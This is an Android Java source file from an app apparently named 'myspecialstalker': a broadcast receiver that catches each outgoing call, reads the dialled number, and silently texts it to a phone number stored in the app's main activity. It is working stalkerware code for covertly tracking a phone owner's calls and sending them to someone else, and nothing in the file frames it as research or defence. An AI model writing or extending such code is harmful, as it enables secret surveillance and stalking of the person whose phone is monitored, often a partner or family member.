package com.example.sin_een.myspecialstalker;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;

public class OutgoingCallsBroadcastReciever extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {

        if(Intent.ACTION_NEW_OUTGOING_CALL.equals((intent.getAction()))) {
            String calledNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
            if (MainActivity.isReady())
            {
                String messageToSend = MainActivity.localMessage + calledNumber;
                SmsManager smsManager = SmsManager.getDefault();
                smsManager.sendTextMessage(MainActivity.localPhone, null, messageToSend, null, null);
            }

        }
    }
}
